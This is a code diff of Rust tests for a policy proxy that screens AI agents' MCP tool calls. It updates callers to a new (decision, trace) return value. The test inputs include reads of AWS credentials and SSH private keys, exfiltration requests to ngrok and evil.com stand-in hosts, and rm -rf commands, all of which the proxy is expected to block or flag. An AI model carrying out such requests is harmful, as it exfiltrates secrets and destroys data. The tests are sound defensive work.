@@ -58,7 +58,7 @@ priority = 1
 #[test]
 fn proxy_denies_bash_from_config() {
     let (bridge, _audit, _tmp) = bridge_from_toml(BASIC_POLICY_TOML);
-    let decision =
+    let (decision, _trace) =
         bridge.evaluate_tool_call(&json!(1), "bash", &json!({"command": "id"}), None, None);
     assert!(
         matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
@@ -69,7 +69,7 @@ fn proxy_denies_bash_from_config() {
 #[test]
 fn proxy_allows_file_read_from_config() {
     let (bridge, _audit, _tmp) = bridge_from_toml(BASIC_POLICY_TOML);
-    let decision = bridge.evaluate_tool_call(
+    let (decision, _trace) = bridge.evaluate_tool_call(
         &json!(2),
         "file",
         &json!({"path": "/tmp/test.txt"}),
@@ -85,7 +85,8 @@ fn proxy_allows_file_read_from_config() {
 #[test]
 fn proxy_denies_unknown_tool_from_config() {
     let (bridge, _audit, _tmp) = bridge_from_toml(BASIC_POLICY_TOML);
-    let decision = bridge.evaluate_tool_call(&json!(3), "unknown_tool", &json!({}), None, None);
+    let (decision, _trace) =
+        bridge.evaluate_tool_call(&json!(3), "unknown_tool", &json!({}), None, None);
     assert!(
         matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
         "unknown tool must be denied by default-deny policy"
@@ -119,7 +120,8 @@ fn full_mcp_message_to_proxy_decision() {
             arguments,
         } => {
             // Step 2: Evaluate through proxy
-            let decision = bridge.evaluate_tool_call(&id, &tool_name, &arguments, None, None);
+            let (decision, _trace) =
+                bridge.evaluate_tool_call(&id, &tool_name, &arguments, None, None);
             match decision {
                 ProxyDecision::Block(response, Verdict::Deny { reason }) => {
                     // Verify JSON-RPC error response
@@ -186,7 +188,7 @@ fn demo_config_mcp_proxy_blocks_credential_access() {
     let (bridge, _audit, _tmp) = bridge_from_toml(DEMO_CONFIG);
 
     // MCP tools/call for reading AWS credentials
-    let decision = bridge.evaluate_tool_call(
+    let (decision, _trace) = bridge.evaluate_tool_call(
         &json!(100),
         "file_system",
         &json!({"path": "/home/user/.aws/credentials"}),
@@ -203,7 +205,7 @@ fn demo_config_mcp_proxy_blocks_credential_access() {
 fn demo_config_mcp_proxy_blocks_exfiltration() {
     let (bridge, _audit, _tmp) = bridge_from_toml(DEMO_CONFIG);
 
-    let decision = bridge.evaluate_tool_call(
+    let (decision, _trace) = bridge.evaluate_tool_call(
         &json!(101),
         "http_request",
         &json!({"url": "https://abc.ngrok.io/exfil", "body": "secrets"}),
@@ -220,7 +222,7 @@ fn demo_config_mcp_proxy_blocks_exfiltration() {
 fn demo_config_mcp_proxy_allows_safe_operations() {
     let (bridge, _audit, _tmp) = bridge_from_toml(DEMO_CONFIG);
 
-    let decision = bridge.evaluate_tool_call(
+    let (decision, _trace) = bridge.evaluate_tool_call(
         &json!(102),
         "file_system",
         &json!({"path": "/home/user/project/src/main.rs"}),
@@ -242,7 +244,7 @@ fn demo_config_mcp_proxy_bash_falls_to_default_allow() {
     // for the HTTP API where callers explicitly specify function="execute".
     let (bridge, _audit, _tmp) = bridge_from_toml(DEMO_CONFIG);
 
-    let decision = bridge.evaluate_tool_call(
+    let (decision, _trace) = bridge.evaluate_tool_call(
         &json!(103),
         "bash",
         &json!({"command": "rm -rf /important"}),
@@ -277,7 +279,7 @@ fn proxy_decisions_produce_audit_entries() {
         // Block a bash command — the proxy itself doesn't auto-audit in evaluate_tool_call,
         // but the caller (proxy loop) does. Simulate that pattern here.
         let action = extract_action("bash", &json!({"command": "whoami"}));
-        let decision = bridge.evaluate_tool_call(
+        let (decision, _trace) = bridge.evaluate_tool_call(
             &json!(50),
             "bash",
             &json!({"command": "whoami"}),
@@ -297,7 +299,7 @@ fn proxy_decisions_produce_audit_entries() {
 
         // Allow a file read
         let action2 = extract_action("file", &json!({"path": "/tmp/ok.txt"}));
-        let decision2 = bridge.evaluate_tool_call(
+        let (decision2, _trace2) = bridge.evaluate_tool_call(
             &json!(51),
             "file",
             &json!({"path": "/tmp/ok.txt"}),
@@ -372,7 +374,7 @@ priority = 1
     let (bridge, _audit, _tmp) = bridge_from_toml(policy_toml);
 
     // Blocked by glob constraint
-    let decision = bridge.evaluate_tool_call(
+    let (decision, _trace) = bridge.evaluate_tool_call(
         &json!(60),
         "editor",
         &json!({"file": "/home/user/.ssh/id_rsa"}),
@@ -385,7 +387,7 @@ priority = 1
     );
 
     // Allowed — no constraint fires
-    let decision = bridge.evaluate_tool_call(
+    let (decision, _trace) = bridge.evaluate_tool_call(
         &json!(61),
         "editor",
         &json!({"file": "/home/user/docs/notes.txt"}),
@@ -424,7 +426,7 @@ priority = 1
     let (bridge, _audit, _tmp) = bridge_from_toml(policy_toml);
 
     // Blocked: ngrok
-    let decision = bridge.evaluate_tool_call(
+    let (decision, _trace) = bridge.evaluate_tool_call(
         &json!(70),
         "http",
         &json!({"url": "https://abc.ngrok.io/data"}),
@@ -437,7 +439,7 @@ priority = 1
     );
 
     // Blocked: evil.com
-    let decision = bridge.evaluate_tool_call(
+    let (decision, _trace) = bridge.evaluate_tool_call(
         &json!(71),
         "http",
         &json!({"url": "https://sub.evil.com/collect"}),
@@ -450,7 +452,7 @@ priority = 1
     );
 
     // Allowed: safe domain
-    let decision = bridge.evaluate_tool_call(
+    let (decision, _trace) = bridge.evaluate_tool_call(
         &json!(72),
         "http",
         &json!({"url": "https://api.github.com/repos"}),
@@ -488,7 +490,7 @@ priority = 1
     let (bridge, _audit, _tmp) = bridge_from_toml(policy_toml);
 
     // Requires approval: rm -rf
-    let decision = bridge.evaluate_tool_call(
+    let (decision, _trace) = bridge.evaluate_tool_call(
         &json!(80),
         "bash",
         &json!({"command": "rm -rf /tmp/test"}),
@@ -504,7 +506,7 @@ priority = 1
     );
 
     // Allowed: safe command
-    let decision = bridge.evaluate_tool_call(
+    let (decision, _trace) = bridge.evaluate_tool_call(
         &json!(81),
         "bash",
         &json!({"command": "ls -la /tmp"}),
@@ -546,7 +548,7 @@ priority = 1
     let audit = Arc::new(AuditLogger::new(tmp.path().join("audit.log")));
     let bridge = ProxyBridge::new(engine, policies, audit).with_trace(true);
 
-    let decision =
+    let (decision, _trace) =
         bridge.evaluate_tool_call(&json!(90), "bash", &json!({"command": "id"}), None, None);
     assert!(
         matches!(decision, ProxyDecision::Block(_, Verdict::Deny { .. })),
